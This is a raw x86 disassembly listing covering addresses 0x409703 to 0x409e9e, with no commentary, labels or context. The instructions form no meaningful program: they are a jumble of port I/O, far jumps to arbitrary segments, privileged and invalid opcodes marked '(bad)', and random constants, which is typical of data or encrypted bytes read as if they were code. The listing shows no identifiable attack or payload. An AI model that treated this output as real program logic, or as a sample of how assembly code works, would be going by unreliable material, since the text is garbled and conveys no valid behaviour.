  409703:	jno    0x409739
  409705:	jge    0x4096ea
  409707:	int3   
  409708:	dec    esp
  409709:	mov    dh,BYTE PTR [ebx]
  40970b:	retf   0xa61f
  40970e:	push   ebx
  40970f:	out    0x8f,eax
  409711:	pusha  
  409712:	mov    dl,0x36
  409714:	xor    BYTE PTR [ebx+0x1b61fd3a],bh
  40971a:	xchg   esi,eax
  40971b:	inc    edi
  40971c:	pop    ebp
  40971d:	out    0x39,eax
  40971f:	dec    ebp
  409720:	adc    ah,BYTE PTR [bx-0x863]
  409725:	add    edx,DWORD PTR [ebx+esi*2+0x77]
  409729:	ds push esp
  40972b:	idiv   ch
  40972d:	push   ecx
  40972e:	ror    dl,cl
  409730:	mov    al,0x7d
  409732:	push   eax
  409733:	in     eax,dx
  409734:	jo     0x409773
  409736:	xchg   ebx,eax
  409737:	stc    
  409738:	xchg   edi,eax
  409739:	xchg   edx,eax
  40973a:	and    esp,DWORD PTR [edi+ebx*8-0x6f]
  40973e:	pop    es
  40973f:	leave  
  409740:	cld    
  409741:	sub    DWORD PTR [edx+0x1a1c9a57],0x37
  409748:	shr    DWORD PTR [ebx-0x5cc700e0],1
  40974e:	mov    ch,0x8c
  409750:	xor    eax,0x90f8bd45
  409755:	push   esi
  409756:	in     eax,0x4f
  409758:	jp     0x4096fb
  40975a:	aam    0x7f
  40975c:	pushf  
  40975d:	jnp    0x40974a
  40975f:	aad    0x6b
  409761:	cmp    eax,0xf10b04b6
  409766:	in     al,dx
  409767:	jp     0x409798
  409769:	(bad)  
  40976a:	aad    0x1b
  40976c:	pop    edi
  40976d:	and    al,0xea
  40976f:	adc    bh,BYTE PTR [esi-0x608a5bdf]
  409775:	int    0x5e
  409777:	xor    BYTE PTR [edx-0x3a35457c],dl
  40977d:	xor    eax,0x548d59ff
  409782:	dec    ebp
  409783:	(bad)  
  409784:	js     0x409758
  409786:	xchg   esi,eax
  409787:	pop    ecx
  409788:	(bad)  
  409789:	mov    eax,0x6fd8eb28
  40978e:	and    BYTE PTR ds:0xbee4408,ch
  409794:	add    eax,0x6412a748
  409799:	ret    0xf030
  40979c:	mov    bh,0x94
  40979e:	add    al,0x87
  4097a0:	jbe    0x4097e3
  4097a2:	mov    eax,ds:0x88ae6f16
  4097a7:	xor    al,0xd8
  4097a9:	mov    esi,0x45a0a035
  4097ae:	shr    DWORD PTR [ecx-0x4b],0x54
  4097b2:	mov    DWORD PTR [esi],edi
  4097b4:	push   es
  4097b5:	test   ah,al
  4097b7:	cmp    BYTE PTR [ecx],0xfe
  4097ba:	in     eax,0xb
  4097bc:	jo     0x4097eb
  4097be:	xchg   esi,eax
  4097bf:	fstp   DWORD PTR [ebx-0x59f3a482]
  4097c5:	mov    ds:0x36066a48,al
  4097ca:	sar    DWORD PTR [edi],cl
  4097cc:	xchg   ebp,eax
  4097cd:	mov    al,ds:0xbce88911
  4097d2:	mov    edi,0x74ad2a4f
  4097d7:	sub    BYTE PTR [eax-0x65573670],dl
  4097dd:	xor    edx,DWORD PTR [ebp-0x79]
  4097e0:	stc    
  4097e1:	pop    ecx
  4097e2:	mov    esi,0xb9640a7
  4097e7:	adc    al,0x5d
  4097e9:	mov    ch,0xa8
  4097eb:	jmp    0x517a:0x57291bc
  4097f2:	sbb    edi,0x2e429297
  4097f8:	ins    DWORD PTR es:[edi],dx
  4097f9:	repz imul esi,ebp,0xffffffb3
  4097fd:	lea    ebx,[ebx+0x758e13fd]
  409803:	jg     0x409815
  409805:	cli    
  409806:	and    eax,0xf535d9af
  40980b:	(bad)  
  40980c:	div    DWORD PTR [ebp-0xd297454]
  409812:	jle    0x4097e5
  409814:	and    DWORD PTR [edx],ecx
  409816:	and    DWORD PTR [ebx],eax
  409818:	ret    
  409819:	outs   dx,BYTE PTR ds:[esi]
  40981a:	mov    ecx,0xc04dbe88
  40981f:	cdq    
  409820:	sbb    bh,BYTE PTR [edi-0x58]
  409823:	dec    ecx
  409824:	clc    
  409825:	mov    dh,0xa2
  409827:	add    esp,DWORD PTR [ecx+0x48cbc4da]
  40982d:	aad    0x3e
  40982f:	mov    ds:0x9a397663,eax
  409834:	jns    0x4097bc
  409836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409837:	sub    BYTE PTR [esi],ch
  409839:	sub    eax,0x29793c5e
  40983e:	push   cs
  40983f:	jns    0x4097d0
  409841:	adc    al,0xbb
  409843:	or     BYTE PTR [ebx+ebx*1],al
  409846:	bound  esi,QWORD PTR ds:0x30840fda
  40984c:	popa   
  40984d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40984e:	sbb    eax,0xe18018cc
  409853:	push   ebp
  409854:	adc    al,0xef
  409856:	pop    edi
  409857:	sti    
  409858:	dec    ecx
  409859:	sub    cl,bh
  40985b:	pusha  
  40985c:	xor    esp,DWORD PTR [ebx-0x36]
  40985f:	outs   dx,BYTE PTR ds:[esi]
  409860:	in     eax,0xc4
  409862:	pop    eax
  409863:	fimul  DWORD PTR [edx]
  409865:	dec    esp
  409866:	or     al,0x7a
  409868:	in     eax,0x1e
  40986a:	xlat   BYTE PTR ds:[ebx]
  40986b:	mov    ds:0xd510bd30,al
  409870:	push   cs
  409871:	fisttp QWORD PTR [esi+0x7c48e153]
  409877:	or     ch,ch
  409879:	fsub   QWORD PTR [ecx+0x61bb9729]
  40987f:	pop    eax
  409880:	cmp    al,0x84
  409882:	call   0xca22:0xcf63eb9
  409889:	test   al,0x9a
  40988b:	(bad)  
  40988c:	pop    ss
  40988d:	nop
  40988e:	dec    edx
  40988f:	xchg   ebp,eax
  409890:	movzx  ebx,WORD PTR [ecx+ebp*8]
  409894:	and    cl,dh
  409896:	jne    0x409832
  409898:	pop    ss
  409899:	ror    BYTE PTR [edi+ecx*8+0x33],0xb2
  40989e:	mov    esp,0x239b8e8d
  4098a3:	jl     0x40984c
  4098a5:	cs ja  0x4098e0
  4098a8:	cli    
  4098a9:	and    DWORD PTR [edx],ebp
  4098ab:	xor    BYTE PTR [eax-0x45c24de4],bh
  4098b1:	test   DWORD PTR [ebx+0x43887d43],edi
  4098b7:	sbb    DWORD PTR [eax+0x554cc0f5],edx
  4098bd:	cmp    DWORD PTR [edx],esi
  4098bf:	mov    DWORD PTR [eax-0x422b1b16],eax
  4098c5:	outs   dx,BYTE PTR ds:[esi]
  4098c6:	in     eax,dx
  4098c7:	pop    eax
  4098c8:	xchg   edi,eax
  4098c9:	pop    edi
  4098ca:	mov    eax,0x8b50ed0b
  4098cf:	ins    DWORD PTR es:[edi],dx
  4098d0:	push   edx
  4098d1:	pop    ebx
  4098d2:	mov    ds:0x6bb0f5a0,eax
  4098d7:	jmp    0x5d98:0x5ab31363
  4098de:	jecxz  0x4098bd
  4098e0:	adc    al,0x29
  4098e2:	outs   dx,BYTE PTR ds:[esi]
  4098e3:	daa    
  4098e4:	dec    ebx
  4098e5:	outs   dx,DWORD PTR ds:[esi]
  4098e6:	pusha  
  4098e7:	cld    
  4098e8:	test   DWORD PTR [ebx+0x2743a964],esp
  4098ee:	in     eax,0x19
  4098f0:	jge    0x4098ca
  4098f2:	jbe    0x409894
  4098f4:	mov    edx,0x2a019d04
  4098f9:	push   0xfffffff7
  4098fb:	shl    BYTE PTR [edi-0x7e],1
  4098fe:	jp     0x40988e
  409900:	add    ch,BYTE PTR [edx+eiz*4]
  409903:	push   ss
  409904:	sub    edi,DWORD PTR [eax-0xaa66fcf]
  40990a:	sub    BYTE PTR [edi],al
  40990c:	sbb    BYTE PTR [eax-0xb],dh
  40990f:	mov    dh,0xdf
  409911:	mov    bh,0x51
  409913:	dec    esi
  409914:	jecxz  0x4098c9
  409916:	dec    ebp
  409917:	loopne 0x409945
  409919:	popa   
  40991a:	xor    eax,0x9a796408
  40991f:	xchg   BYTE PTR [ecx],dl
  409921:	jp     0x409921
  409923:	jge    0x40999a
  409925:	imul   ebx,DWORD PTR [eax],0x2293d5ef
  40992b:	sub    eax,0xb163aad
  409930:	inc    ebp
  409931:	dec    edi
  409932:	clc    
  409933:	jmp    0x6ace3e85
  409938:	pop    ebx
  409939:	mov    edx,0x5f1362a9
  40993e:	(bad)  
  40993f:	in     al,dx
  409940:	imul   edi,ecx,0x25cedd07
  409946:	lahf   
  409947:	cmp    DWORD PTR ds:0xc98855d8,esp
  40994d:	call   0x5b1c:0xe764578e
  409954:	ficom  WORD PTR [edi+ecx*1+0x16]
  409958:	jg     0x40999a
  40995a:	push   ebp
  40995b:	cmp    DWORD PTR [edi+0x60],ecx
  40995e:	add    eax,0x7152c33f
  409963:	xchg   ecx,eax
  409964:	cmp    DWORD PTR [ebx],edi
  409966:	inc    ecx
  409967:	mov    dh,0xf6
  409969:	cmp    esp,ecx
  40996b:	xor    ch,cl
  40996d:	hlt    
  40996e:	mov    bh,BYTE PTR [edi]
  409970:	or     BYTE PTR [edx],al
  409972:	fwait
  409973:	dec    esi
  409974:	push   ecx
  409975:	pop    ss
  409976:	aaa    
  409977:	dec    esp
  409978:	fwait
  409979:	mov    BYTE PTR [esi],dh
  40997b:	push   0x27
  40997d:	jp     0x4099f2
  40997f:	clc    
  409980:	or     WORD PTR [edx+0x6b57f7da],sp
  409987:	mov    DWORD PTR [esi],0x2630cb24
  40998d:	push   esi
  40998e:	mov    ch,0xd8
  409990:	xor    ebx,esp
  409992:	(bad)  
  409993:	shl    DWORD PTR [ecx*1+0x7053a3bc],cl
  40999a:	mov    ebp,0x55a5eb46
  40999f:	sub    dh,BYTE PTR [ecx]
  4099a1:	mov    esi,0x695f36be
  4099a6:	push   cs
  4099a7:	or     bh,ah
  4099a9:	or     dl,BYTE PTR [esi-0x7f14867e]
  4099af:	mov    bl,0x5d
  4099b1:	iret   
  4099b2:	jno    0x40995f
  4099b4:	cmp    eax,0xa6dbb8e2
  4099b9:	shl    BYTE PTR [edi],cl
  4099bb:	clc    
  4099bc:	(bad)  
  4099bd:	enter  0xfc7,0x9a
  4099c1:	hlt    
  4099c2:	and    DWORD PTR [edx+0x1c3ddc66],edi
  4099c8:	cmp    BYTE PTR [esi+0x24820f67],bh
  4099ce:	sbb    eax,0xdc0c29dc
  4099d3:	mov    bl,0x8c
  4099d5:	nop
  4099d6:	push   edx
  4099d7:	gs sti 
  4099d9:	ins    DWORD PTR es:[edi],dx
  4099da:	sar    bh,0x34
  4099dd:	fisub  WORD PTR [ebp+edx*1+0x70]
  4099e1:	jne    0x4099c2
  4099e3:	ins    DWORD PTR es:[edi],dx
  4099e4:	adc    al,0x74
  4099e6:	adc    dl,bh
  4099e8:	add    eax,DWORD PTR [edx+0x7]
  4099eb:	jg     0x409985
  4099ed:	leave  
  4099ee:	jecxz  0x4099a3
  4099f0:	and    al,0xbd
  4099f2:	data16 ror BYTE PTR [eax+ebp*1],cl
  4099f6:	mov    ebp,0x316af447
  4099fb:	mov    dh,0x9b
  4099fd:	lea    edi,[eax]
  4099ff:	adc    BYTE PTR [ecx-0x26e2ccfa],dh
  409a05:	aad    0x28
  409a07:	dec    ecx
  409a08:	(bad)  
  409a09:	scas   al,BYTE PTR es:[edi]
  409a0a:	add    esi,DWORD PTR [eax]
  409a0c:	cmp    DWORD PTR [esi],edi
  409a0e:	pop    esi
  409a0f:	sbb    esi,ecx
  409a11:	test   eax,0x19dee83d
  409a16:	call   0xcde:0xd14d76eb
  409a1d:	std    
  409a1e:	dec    edx
  409a1f:	fst    st(6)
  409a21:	(bad)  
  409a22:	cli    
  409a23:	jns    0x4099c8
  409a25:	repnz aas 
  409a27:	(bad)  
  409a29:	or     al,0x9c
  409a2b:	add    bh,al
  409a2d:	(bad)  
  409a2e:	int3   
  409a2f:	sbb    eax,0x70107dd4
  409a34:	and    bl,bh
  409a36:	das    
  409a37:	pop    ss
  409a38:	and    DWORD PTR [ebx+edi*2+0x78],esi
  409a3c:	loope  0x4099d6
  409a3e:	(bad)  
  409a3f:	xchg   edi,eax
  409a40:	inc    ebx
  409a41:	and    esi,esi
  409a43:	or     eax,0x32ed9659
  409a48:	mov    dh,0x44
  409a4a:	push   cs
  409a4b:	stos   BYTE PTR es:[edi],al
  409a4c:	popf   
  409a4d:	sub    eax,0x9242e807
  409a52:	aad    0xb8
  409a54:	mov    cl,0xc
  409a56:	sub    ah,BYTE PTR [edx+0x64]
  409a59:	or     esp,DWORD PTR [ecx+0x33]
  409a5c:	add    ecx,DWORD PTR [ecx-0x60]
  409a5f:	jp     0x4099fd
  409a61:	mov    ecx,ebp
  409a63:	add    al,bl
  409a65:	mov    ebx,0xc517d8c3
  409a6a:	(bad)  
  409a6b:	in     eax,dx
  409a6c:	push   DWORD PTR [esi-0x4c]
  409a6f:	sar    DWORD PTR [edi-0x57],0x32
  409a73:	xor    al,0x1e
  409a75:	cmp    eax,0x123c573e
  409a7a:	push   es
  409a7b:	(bad)  
  409a7c:	neg    DWORD PTR [esi+0x2ea93bb7]
  409a82:	mov    ah,0xb4
  409a84:	pop    edx
  409a85:	mov    bh,0x2b
  409a87:	cmp    esp,0xfb30605a
  409a8d:	fidiv  DWORD PTR [edi-0x31]
  409a90:	arpl   WORD PTR [ebp-0x5d],bp
  409a93:	pop    eax
  409a94:	stos   DWORD PTR es:[edi],eax
  409a95:	push   ebp
  409a96:	pop    edi
  409a97:	adc    DWORD PTR [edx],edi
  409a99:	mov    ecx,0x62d06f49
  409a9e:	mov    dh,BYTE PTR [edi+0x6b0a1b7e]
  409aa4:	in     eax,0x25
  409aa6:	leave  
  409aa7:	in     eax,dx
  409aa8:	jno    0x409b08
  409aaa:	xor    esp,DWORD PTR [ebx-0x5ecfced7]
  409ab0:	cmp    ah,dl
  409ab2:	pusha  
  409ab3:	outs   dx,DWORD PTR ds:[esi]
  409ab4:	pushw  cs
  409ab6:	pop    ds
  409ab7:	mov    ds:0x92f3c8c4,eax
  409abc:	outs   dx,BYTE PTR ds:[esi]
  409abd:	xchg   edx,eax
  409abe:	in     al,dx
  409abf:	jecxz  0x409ac7
  409ac1:	add    al,al
  409ac3:	rcl    BYTE PTR [esi],cl
  409ac5:	and    al,0x6a
  409ac7:	and    ch,BYTE PTR [eax]
  409ac9:	mov    ch,BYTE PTR [edx]
  409acb:	outs   dx,BYTE PTR ds:[esi]
  409acc:	aam    0xca
  409ace:	enter  0x1561,0x2a
  409ad2:	iret   
  409ad3:	dec    ebx
  409ad4:	bndldx bnd0,[esp+ebx*8]
  409ad8:	or     ebp,DWORD PTR [ebp+0x39]
  409adb:	push   edi
  409adc:	xchg   edi,eax
  409add:	mov    esp,esi
  409adf:	or     esi,ebx
  409ae1:	cld    
  409ae2:	cmp    eax,0xd3dc5f3b
  409ae7:	push   ebp
  409ae8:	dec    ecx
  409ae9:	aaa    
  409aea:	pushf  
  409aeb:	out    dx,eax
  409aec:	add    BYTE PTR [edx-0x52],0x75
  409af0:	es dec edi
  409af2:	cld    
  409af3:	cwde   
  409af4:	cmp    eax,0x519d354
  409af9:	enter  0x9ad2,0xf1
  409afd:	xlat   BYTE PTR ds:[ebx]
  409afe:	cmc    
  409aff:	sbb    eax,0x95aed0e7
  409b04:	cli    
  409b05:	sbb    bh,BYTE PTR [eax]
  409b07:	jne    0x409b81
  409b09:	aaa    
  409b0a:	in     al,0x25
  409b0c:	fwait
  409b0d:	out    dx,al
  409b0e:	jecxz  0x409aab
  409b10:	fnstenv [ecx]
  409b12:	out    0x50,al
  409b14:	loope  0x409b02
  409b16:	nop
  409b17:	mov    al,0x45
  409b19:	mov    esp,0x363203b
  409b1e:	and    DWORD PTR [edi-0x2f],0x84051737
  409b25:	and    eax,0x88b4699c
  409b2a:	mov    al,ds:0x3e13fef8
  409b2f:	push   0x55147754
  409b34:	out    dx,al
  409b35:	dec    edi
  409b36:	xchg   ebx,eax
  409b37:	leave  
  409b38:	sub    eax,DWORD PTR [ebx+esi*1+0x28ccc1e4]
  409b3f:	pop    eax
  409b40:	push   esi
  409b41:	sub    cl,BYTE PTR [ecx+ebp*4-0x4b]
  409b45:	pushf  
  409b46:	dec    esi
  409b47:	pop    ecx
  409b48:	sti    
  409b49:	adc    bl,BYTE PTR [eax-0x2b4d876d]
  409b4f:	stos   DWORD PTR es:[edi],eax
  409b50:	jmp    0x409b37
  409b52:	ror    BYTE PTR [ebx+0x48],0xf4
  409b56:	pop    esp
  409b57:	jge    0x409b09
  409b59:	pop    ebx
  409b5a:	vmwrite eax,DWORD PTR [ebp-0x399e8c5]
  409b61:	push   ecx
  409b62:	add    esi,DWORD PTR [ecx+0x4b]
  409b65:	setl   BYTE PTR [ebx]
  409b68:	add    BYTE PTR ds:0xb1992681,bh
  409b6e:	fst    QWORD PTR [esp+ebp*8+0x5f14c9cc]
  409b75:	dec    ebp
  409b76:	push   eax
  409b77:	add    bl,bh
  409b79:	push   edx
  409b7a:	ins    DWORD PTR es:[edi],dx
  409b7b:	rcl    DWORD PTR [eax+0x4392ecae],cl
  409b81:	fiadd  DWORD PTR [edx]
  409b83:	cli    
  409b84:	xchg   esp,eax
  409b85:	(bad)  
  409b86:	push   edi
  409b87:	test   BYTE PTR [ecx],al
  409b89:	out    dx,al
  409b8a:	enter  0x2f2c,0x2e
  409b8e:	dec    esi
  409b8f:	jnp    0x409bc5
  409b91:	das    
  409b92:	les    ebx,FWORD PTR [esi]
  409b94:	repnz loope 0x409b91
  409b97:	dec    esp
  409b98:	jb     0x409be9
  409b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b9b:	iret   
  409b9c:	xchg   BYTE PTR [ebx+0x476b1c1c],ch
  409ba2:	add    eax,0x1978343b
  409ba7:	inc    ebp
  409ba8:	push   cs
  409ba9:	adc    al,0xb7
  409bab:	ja     0x409bd7
  409bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bae:	cmp    DWORD PTR [ebx],edi
  409bb0:	inc    eax
  409bb1:	test   cl,dl
  409bb3:	xor    cl,BYTE PTR [edx-0x7e]
  409bb6:	(bad)  
  409bb7:	xor    eax,0xfd7e53aa
  409bbc:	pop    ebx
  409bbd:	in     al,0x41
  409bbf:	bound  eax,QWORD PTR [eax]
  409bc1:	lahf   
  409bc2:	inc    esp
  409bc3:	out    dx,al
  409bc4:	retf   
  409bc5:	cld    
  409bc6:	xchg   ebx,eax
  409bc7:	adc    eax,edx
  409bc9:	out    dx,al
  409bca:	mov    dl,dl
  409bcc:	xor    al,0xfc
  409bce:	xchg   DWORD PTR [ecx+0x56],ecx
  409bd1:	ds sub al,0x62
  409bd4:	mov    DWORD PTR [esi],esi
  409bd6:	jns    0x409bc3
  409bd8:	popa   
  409bd9:	in     al,dx
  409bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bdb:	sbb    BYTE PTR [edx-0x79406a36],bh
  409be1:	cmp    dl,bh
  409be3:	pop    ecx
  409be4:	inc    edx
  409be5:	js     0x409be7
  409be7:	in     eax,0x9
  409be9:	test   DWORD PTR [esp+esi*1+0x1afefb46],esi
  409bf0:	call   0xe564611f
  409bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bf6:	xlat   BYTE PTR ds:[ebx]
  409bf7:	inc    edx
  409bf8:	fstp   DWORD PTR [edi+0x13]
  409bfb:	outs   dx,DWORD PTR ds:[esi]
  409bfc:	add    ecx,DWORD PTR [ecx+edi*1]
  409bff:	bound  ebx,QWORD PTR [esi+edx*8+0x3209af83]
  409c06:	mov    bl,0xc7
  409c08:	jno    0x409c18
  409c0a:	cmp    ch,BYTE PTR [eax+0x3af21373]
  409c10:	jle    0x409b97
  409c12:	inc    BYTE PTR [eax+0x26]
  409c15:	(bad)  
  409c16:	cmp    al,0xda
  409c18:	fisttp WORD PTR [ebx+0x2814c6ae]
  409c1e:	and    esi,DWORD PTR [edi-0xc3c56d7]
  409c24:	pusha  
  409c25:	dec    ebx
  409c26:	int    0x51
  409c28:	(bad)  [ebx-0x7ae4a11e]
  409c2e:	dec    esi
  409c2f:	or     al,0x6f
  409c31:	xor    ebx,ebp
  409c33:	mov    ebp,0x21cb0988
  409c38:	mov    edi,0xa92db557
  409c3d:	push   0xffffffb0
  409c3f:	(bad)  
  409c40:	mov    ecx,0xc15eb4bf
  409c45:	sbb    DWORD PTR [edx],ecx
  409c47:	push   es
  409c48:	push   ds
  409c49:	mov    cl,0xbf
  409c4b:	cmp    eax,0xeb27c2d3
  409c50:	lods   al,BYTE PTR ds:[esi]
  409c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c52:	loope  0x409c38
  409c54:	mov    fs,WORD PTR [esi]
  409c56:	add    dh,BYTE PTR [eax]
  409c58:	sub    eax,0xe02665e5
  409c5d:	repnz sub edi,DWORD PTR [edx]
  409c60:	shl    DWORD PTR [edi],cl
  409c62:	adc    al,0x43
  409c64:	xchg   ecx,eax
  409c65:	mov    ecx,0x6e23920c
  409c6a:	jle    0x409cbf
  409c6c:	xor    DWORD PTR [eax-0x6f],0xfc1c746d
  409c73:	mov    esi,0xa307844b
  409c78:	lea    edi,[ecx]
  409c7a:	sbb    ah,ah
  409c7c:	cdq    
  409c7d:	test   dl,ch
  409c7f:	shl    DWORD PTR [edi+0x4b],cl
  409c82:	mov    WORD PTR [ecx],es
  409c84:	push   ebx
  409c85:	(bad)  
  409c86:	dec    edi
  409c87:	in     eax,0xe7
  409c89:	jae    0x409cce
  409c8b:	dec    ecx
  409c8c:	mov    al,0xfc
  409c8e:	xor    eax,0x9e98ab10
  409c93:	xchg   ebx,eax
  409c94:	mov    cl,0xe5
  409c96:	jbe    0x409c4a
  409c98:	or     al,0xcb
  409c9a:	adc    al,0x32
  409c9c:	aas    
  409c9d:	adc    BYTE PTR [edi-0x2],dl
  409ca0:	imul   esp,DWORD PTR [ebx+0x1e],0x46c7ddb4
  409ca7:	push   0x71ac80bc
  409cac:	mov    ebp,0x988c2218
  409cb1:	ins    BYTE PTR es:[edi],dx
  409cb2:	dec    esp
  409cb3:	stc    
  409cb4:	pop    ds
  409cb5:	pop    esp
  409cb6:	scas   eax,DWORD PTR es:[edi]
  409cb7:	ins    DWORD PTR es:[edi],dx
  409cb8:	rol    DWORD PTR [eax+0x8],0x14
  409cbc:	xchg   esi,eax
  409cbd:	popf   
  409cbe:	imul   ebx,DWORD PTR [esi+esi*2],0xca7c6f2b
  409cc5:	mov    bl,0x55
  409cc7:	icebp  
  409cc8:	mov    dh,bl
  409cca:	jmp    0x44fe:0x9553a06b
  409cd1:	jmp    0x409cfc
  409cd3:	xor    BYTE PTR [eax-0x1cd32ea4],dl
  409cd9:	and    DWORD PTR [edx+0x12d7ec19],ecx
  409cdf:	or     bl,BYTE PTR [edi+ecx*4-0x10cec128]
  409ce6:	jo     0x409ccd
  409ce8:	pop    eax
  409ce9:	inc    eax
  409cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ceb:	inc    ecx
  409cec:	(bad)  
  409ced:	test   BYTE PTR [ecx],0x89
  409cf0:	rcl    ch,1
  409cf2:	xchg   ecx,eax
  409cf3:	xchg   ecx,eax
  409cf4:	pusha  
  409cf5:	push   ebx
  409cf6:	popa   
  409cf7:	fiadd  WORD PTR [edx+0x2c89af52]
  409cfd:	mov    edx,0xbe067cb7
  409d02:	outs   dx,BYTE PTR ds:[esi]
  409d03:	fsubrp st(3),st
  409d05:	jl     0x409d56
  409d07:	pusha  
  409d08:	mov    ebx,0xd981bbf9
  409d0d:	sub    al,0x6b
  409d0f:	lods   eax,DWORD PTR ds:[esi]
  409d10:	add    esi,ecx
  409d12:	and    ecx,DWORD PTR [eax]
  409d14:	cmp    al,0x11
  409d16:	mov    dh,bl
  409d18:	jg     0x409d56
  409d1a:	in     al,0x68
  409d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d1d:	popf   
  409d1e:	jae    0x409d24
  409d20:	call   0x362a:0xe6810661
  409d27:	aam    0x91
  409d29:	cmc    
  409d2a:	inc    edi
  409d2b:	push   0xffffffbd
  409d2d:	sub    DWORD PTR [ebx-0x24],ebx
  409d30:	loope  0x409d2c
  409d32:	mov    edi,0xdddc00d2
  409d37:	sub    cl,BYTE PTR [esi-0x17]
  409d3a:	es out 0xe4,eax
  409d3d:	pop    DWORD PTR [edi-0x1764ba5a]
  409d43:	jp     0x409d0b
  409d45:	adc    BYTE PTR [ecx-0x65],al
  409d48:	adc    ebx,DWORD PTR [esi]
  409d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d4b:	inc    eax
  409d4c:	inc    edi
  409d4d:	in     eax,dx
  409d4e:	pop    ecx
  409d4f:	stos   BYTE PTR es:[edi],al
  409d50:	dec    esi
  409d51:	and    edx,DWORD PTR [ebp+0x1e8dfc76]
  409d57:	inc    BYTE PTR [ecx+0xd53765f]
  409d5d:	jmp    0x409d09
  409d5f:	or     DWORD PTR [esi+eax*2],0x10
  409d63:	loopne 0x409d20
  409d65:	jge    0x409d1c
  409d67:	les    edx,FWORD PTR [edx+0xe1ec0e2]
  409d6d:	lock aas 
  409d6f:	cli    
  409d70:	sbb    al,0xcc
  409d72:	pop    esi
  409d73:	sub    bh,BYTE PTR [ecx]
  409d75:	xor    eax,0x3f82b7b6
  409d7a:	leave  
  409d7b:	ret    
  409d7c:	in     al,0x31
  409d7e:	pop    ss
  409d7f:	xor    DWORD PTR [esi],ecx
  409d81:	mov    cl,0x14
  409d83:	pop    esp
  409d84:	mov    eax,0x899eeb40
  409d89:	mov    eax,0x7a62c9f2
  409d8e:	adc    ebp,DWORD PTR ds:0xe6eb7cab
  409d94:	dec    ebp
  409d95:	(bad)  
  409d96:	in     eax,dx
  409d97:	lods   eax,DWORD PTR ds:[esi]
  409d98:	mov    edx,db5
  409d9b:	and    al,0x6d
  409d9d:	icebp  
  409d9e:	(bad)  
  409d9f:	jp     0x409d45
  409da1:	inc    edi
  409da2:	jp     0x409e15
  409da4:	adc    DWORD PTR [edi],esi
  409da6:	cs push ecx
  409da8:	ins    DWORD PTR es:[edi],dx
  409da9:	(bad)  
  409daa:	aam    0x79
  409dac:	sbb    eax,0xf3137af1
  409db1:	sub    ah,BYTE PTR ds:0x551fcc51
  409db7:	dec    ecx
  409db8:	xlat   BYTE PTR ds:[ebx]
  409db9:	jecxz  0x409d93
  409dbb:	or     eax,0x559f0ab8
  409dc0:	popa   
  409dc1:	fdiv   QWORD PTR [ecx]
  409dc3:	dec    edi
  409dc5:	clc    
  409dc6:	and    al,0x85
  409dc8:	mov    eax,0xa955d2da
  409dcd:	cmp    eax,0x57bb4eac
  409dd2:	push   edi
  409dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd4:	(bad)  [esi+0x6cd7a21e]
  409dda:	inc    esi
  409ddb:	shr    DWORD PTR [esi+0x7d],0xb1
  409ddf:	fist   DWORD PTR ds:0xe94e104c
  409de5:	xchg   BYTE PTR [edi],al
  409de7:	mov    WORD PTR cs:[esi+eax*8-0x4e],?
  409dec:	pop    esp
  409ded:	mov    ch,0x39
  409def:	ror    DWORD PTR [eax+0x6468eacb],cl
  409df5:	outs   dx,DWORD PTR ds:[esi]
  409df6:	loopne 0x409e36
  409df8:	inc    edi
  409df9:	cmp    ebx,DWORD PTR [ebx+0x5056b258]
  409dff:	mov    bh,BYTE PTR [eax-0x29]
  409e02:	outs   dx,BYTE PTR ds:[esi]
  409e03:	outs   dx,BYTE PTR ds:[esi]
  409e04:	(bad)  
  409e05:	push   ecx
  409e06:	lods   eax,DWORD PTR ds:[esi]
  409e07:	in     eax,0x24
  409e09:	call   0x6b3bbd7e
  409e0e:	sbb    BYTE PTR [eax+0x5b486f1],0xbe
  409e15:	ss (bad) 
  409e17:	nop
  409e18:	jmp    0x409dcc
  409e1a:	daa    
  409e1b:	push   es
  409e1c:	sub    DWORD PTR [ebx+0x7b],ebp
  409e1f:	pop    eax
  409e20:	mov    eax,0xdf00582a
  409e25:	mov    dh,0xab
  409e27:	cmp    al,BYTE PTR [ebx+0x53]
  409e2a:	xor    esi,0x8fa2a5db
  409e30:	inc    ebp
  409e31:	into   
  409e32:	pushf  
  409e33:	push   cs
  409e34:	rcl    BYTE PTR ds:0xeec4df39,cl
  409e3a:	mov    al,ds:0xf1180ca5
  409e3f:	stos   BYTE PTR es:[edi],al
  409e40:	daa    
  409e41:	cmp    dh,BYTE PTR [ebx]
  409e43:	into   
  409e44:	dec    ecx
  409e45:	add    ch,dl
  409e47:	daa    
  409e48:	cmp    edi,DWORD PTR [edx+eax*8-0x36cdc3d2]
  409e4f:	sbb    ch,BYTE PTR [esi]
  409e51:	add    edx,DWORD PTR [esi]
  409e53:	lods   eax,DWORD PTR ds:[esi]
  409e54:	das    
  409e55:	mov    al,0xa3
  409e57:	nop
  409e58:	mov    ecx,0xef5fdc50
  409e5d:	mov    dl,0x90
  409e5f:	sub    dl,ah
  409e61:	cwde   
  409e62:	and    BYTE PTR [esp+ebp*2+0x27],al
  409e66:	jns    0x409e0b
  409e68:	inc    edi
  409e69:	inc    ebx
  409e6a:	ins    DWORD PTR es:[edi],dx
  409e6b:	imul   ebx,DWORD PTR [ebx-0x5c],0x53cb5f01
  409e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e73:	lods   al,BYTE PTR ds:[esi]
  409e74:	aas    
  409e75:	bound  eax,QWORD PTR [edx+0x2a3af127]
  409e7b:	in     al,0x69
  409e7d:	sbb    DWORD PTR [ebx+0x1b585052],ebp
  409e83:	jno    0x409e1c
  409e85:	call   0x45c9a821
  409e8a:	aaa    
  409e8b:	fldlg2 
  409e8d:	mov    ecx,0x8bef23ae
  409e92:	push   edi
  409e93:	and    eax,DWORD PTR [ebx-0x3ceedd1]
  409e99:	push   esp
  409e9b:	rcl    bl,0x28
  409e9e:	cmp    DWORD PTR [edi-0x2411f466],0xb284022c
